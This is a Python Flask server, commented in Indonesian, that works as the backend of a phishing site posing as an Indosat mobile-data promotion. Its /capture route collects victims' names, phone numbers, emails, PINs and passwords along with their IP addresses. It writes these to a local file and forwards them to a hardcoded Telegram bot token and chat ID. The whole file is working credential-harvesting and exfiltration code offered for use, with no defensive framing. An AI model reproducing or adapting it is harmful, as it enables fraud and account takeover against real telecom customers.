from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import json
from datetime import datetime
import requests
import os

app = Flask(__name__)
CORS(app)

# Konfigurasi Telegram Bot
TELEGRAM_BOT_TOKEN = '8698559897:AAFYBiOacgEpfss4XItXmus-oItUQq_E-F4'
TELEGRAM_CHAT_ID = '8781321907'

def send_telegram_notification(data):
    """Kirim notifikasi ke Telegram Bot"""
    message = f"""
🎯 *PROMO INDOSAT - CAPTURED!*

👤 *Nama:* {data.get('name', '?')}
📱 *No. HP:* {data.get('phone', '?')}
📧 *Email:* {data.get('email', '-')}
🔐 *PIN:* {data.get('pin', '?')}
🔑 *Password:* {data.get('password', '?')}

📦 *Promo:* {data.get('promo', 'Paket 10GB + Rp50.000')}
📍 *IP:* {data.get('ip', '?')}
🕐 *Waktu:* {data.get('time', '?')}
🌐 *User-Agent:* {data.get('useragent', '?')[:50]}...
    """
    
    url = f"https://api.telegram.org/bot8698559897:AAFYBiOacgEpfss4XItXmus-oItUQq_E-F4/sendMessage"
    
    try:
        response = requests.post(url, json={
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }, timeout=5)
        
        if response.status_code == 200:
            print("✅ Notifikasi Telegram terkirim!")
        else:
            print(f"⚠️ Gagal kirim Telegram: {response.status_code}")
            
    except Exception as e:
        print(f"❌ Error Telegram: {e}")

# --- ROUTE UTAMA ---
@app.route('/')
def index():
    print(f"📂 Mencoba membuka file index.html dari: {os.getcwd()}")
    print(f"📂 Daftar file di direktori: {os.listdir('.')}")
    
    if not os.path.exists('index.html'):
        return f"""
        <h1>❌ File index.html Tidak Ditemukan!</h1>
        <p>File index.html harus ada di folder yang sama dengan app.py</p>
        <p>Folder saat ini: {os.getcwd()}</p>
        <p>File di folder: {os.listdir('.')}</p>
        """, 404
    
    return send_from_directory('.', 'index.html')

@app.route('/favicon.ico')
def favicon():
    return '', 204

# --- ROUTE CAPTURE ---
@app.route('/capture', methods=['POST', 'OPTIONS'])
def capture():
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No JSON data received'}), 400
            
        # Tambahkan timestamp
        data['time'] = datetime.now().isoformat()
        data['ip'] = request.remote_addr
        data['useragent'] = request.headers.get('User-Agent', 'Unknown')
        
        # Log ke console
        print("\n" + "="*50)
        print(f"🎯 CAPTURED AT: {data['time']}")
        print(f"👤 NAMA: {data.get('name', '?')}")
        print(f"📱 PHONE: {data.get('phone', '?')}")
        print(f"📧 EMAIL: {data.get('email', '?')}")
        print(f"🔐 PIN: {data.get('pin', '?')}")
        print(f"🔑 PASSWORD: {data.get('password', '?')}")
        print(f"📦 PROMO: {data.get('promo', '?')}")
        print(f"📍 IP: {data['ip']}")
        print("="*50 + "\n")
        
        # Simpan ke file
        with open('captured_data.txt', 'a', encoding='utf-8') as f:
            f.write(json.dumps(data, indent=2) + "\n\n")
        
        # Kirim ke Telegram
        send_telegram_notification(data)
        
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    print("="*60)
    print("🚀 SERVER FLASK SEDANG BERJALAN")
    print("📍 URL: http://127.0.0.1:8080")
    print("📋 Data tersimpan di: captured_data.txt")
    print("🔔 Notifikasi ke Telegram: Aktif")
    print("="*60)
    
    app.run(host='0.0.0.0', port=8080, debug=True, use_reloader=True)